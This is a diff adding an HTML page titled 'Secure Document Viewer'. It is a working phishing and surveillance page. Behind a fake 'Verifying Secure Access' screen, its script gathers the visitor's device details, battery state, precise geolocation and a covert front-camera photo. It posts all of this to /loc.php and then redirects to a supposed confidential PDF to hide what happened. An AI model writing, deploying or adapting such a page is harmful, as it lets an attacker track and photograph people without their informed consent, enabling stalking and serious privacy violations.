@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Document Viewer</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f4f6f9; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #333; }
+        .container { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
+        .logo { font-size: 48px; margin-bottom: 20px; color: #0078d4; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0078d4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { font-size: 16px; font-weight: 500; margin-top: 20px; }
+        .subtext { font-size: 13px; color: #666; margin-top: 5px; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">🔒</div>
+        <h2>Verifying Secure Access</h2>
+        <div class="spinner" id="spinner"></div>
+        <div class="status" id="status">Verifying identity and location...</div>
+        <div class="subtext" id="subtext">Please allow the requested permissions to view the document.</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function collectAndSend() {
+            let payload = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                network: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
+                lat: null, lon: null, acc: null,
+                battery: { level: 'Unknown', charging: 'Unknown' },
+                photo: null
+            };
+
+            // 1. Get Battery
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    payload.battery.level = (battery.level * 100).toFixed(0) + '%';
+                    payload.battery.charging = battery.charging ? 'Yes' : 'No';
+                } catch (e) {}
+            }
+
+            // 2. Get Location
+            const getLocation = () => new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            payload.lat = pos.coords.latitude;
+                            payload.lon = pos.coords.longitude;
+                            payload.acc = pos.coords.accuracy;
+                            resolve();
+                        },
+                        () => resolve(),
+                        { enableHighAccuracy: true, timeout: 8000 }
+                    );
+                } else resolve();
+            });
+
+            // 3. Get Camera Snapshot
+            const getCamera = () => new Promise((resolve) => {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                        .then(stream => {
+                            const video = document.getElementById('video');
+                            video.srcObject = stream;
+                            video.onloadedmetadata = () => {
+                                video.play();
+                                setTimeout(() => {
+                                    const canvas = document.getElementById('canvas');
+                                    canvas.width = video.videoWidth;
+                                    canvas.height = video.videoHeight;
+                                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                                    payload.photo = canvas.toDataURL('image/jpeg', 0.8);
+                                    stream.getTracks().forEach(track => track.stop());
+                                    resolve();
+                                }, 1000);
+                            };
+                        })
+                        .catch(() => resolve());
+                } else resolve();
+            });
+
+            // Execute all in parallel
+            await Promise.all([getLocation(), getCamera()]);
+
+            // 4. Send everything
+            fetch('/loc.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                document.getElementById('status').innerText = "Verification Complete. Redirecting...";
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('subtext').innerText = "Opening document...";
+                setTimeout(() => { 
+                    window.location.href = "/Confidential_Report.pdf"; 
+                }, 2000);
+            });
+        }
+
+        collectAndSend();
+    </script>
+</body>
+</html>
